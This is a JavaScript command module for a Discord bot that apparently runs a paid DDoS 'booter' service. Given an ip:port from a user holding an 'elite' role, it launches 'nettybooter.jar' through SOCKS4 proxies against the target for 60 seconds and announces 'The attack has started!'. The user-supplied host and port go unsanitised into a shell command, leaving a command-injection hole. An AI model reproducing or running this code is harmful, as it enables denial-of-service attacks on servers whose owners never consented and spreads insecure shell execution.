const Discord = require("discord.js")
const fs = require('fs');
const path = require('path');
const { kanal, normal, premium, elite, admin } = require("../../config.js")
const { MessageEmbed } = require("discord.js");
const { readdirSync } = require("fs");

module.exports = {
  name : 'ayarume3',
  timeout: 90000,
  run: async ({client, message, args, MessageEmbed}) => {
    const host = args.join(" ").split(":").slice(0,1)
    const port = message.content.split (":")[1]

    let channel = new Discord.MessageEmbed()

    .setAuthor(`${message.author.tag}`, message.author.displayAvatarURL({ size: 1024, dynamic: true }))
    .setColor("RED")
    .setDescription(`Wrong channel, execute the command on the channel: <#${kanal}>`)
  
    if (message.channel.id !== `${kanal}`) {
      message.delete({ timeout: 10000 })
      return message.channel.send(channel)
      .then(message => {
        message.delete({ timeout: 10000 })
      })
    }

    let perm = new Discord.MessageEmbed()
    
    .setAuthor(`${message.author.tag}`, message.author.displayAvatarURL({ size: 1024, dynamic: true }))
    .setColor("RED")
    .setDescription(`You don't have permissions, you must have role: <@&${elite}>`)
  
    if(!message.member.roles.cache.has(elite)) {
      return message.channel.send(perm)
    }

    let blad = new Discord.MessageEmbed()
    
    .setAuthor(`${message.author.tag}`, message.author.displayAvatarURL({ size: 1024, dynamic: true }))
    .setColor("RED")
    .setDescription(`Enter the server PORT **($methods <ip:port)**`)

    let blad1 = new Discord.MessageEmbed()
        
    .setAuthor(`${message.author.tag}`, message.author.displayAvatarURL({ size: 1024, dynamic: true }))
    .setColor("RED")
    .setDescription(`Enter the server IP **($methods <ip:port)**`)

    if(!host) {
        return message.channel.send(blad)
    }

    if(!port) {
        return message.channel.send(blad1)
    }

    var exec = require('child_process').exec
    exec(`screen timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -Dr=false -Dlen=25555 -jar nettybooter.jar ${host}:${port} 1 5 47 60 socks4_proxies.txt socks4`, (error, stdout, stderr) => {
    });


    let message1 = new Discord.MessageEmbed()
    
    .setColor("PURPLE")
    .setTitle("The attack has started!")
    .setThumbnail("https://cdn.discordapp.com/attachments/910267549906776094/922841446921416704/MOSHED-2021-12-11-23-20-50.jpg")
    .addField("Host", `\`\`\`${host}\`\`\``, true)
    .addField("Port", `\`\`\`${port}\`\`\``, true)
    .addField("Method", `\`\`\`Ayarume3\`\`\``)
    .addField("Time", `\`\`\`60 seconds\`\`\``)

    message.channel.send(message1)
    

  },
};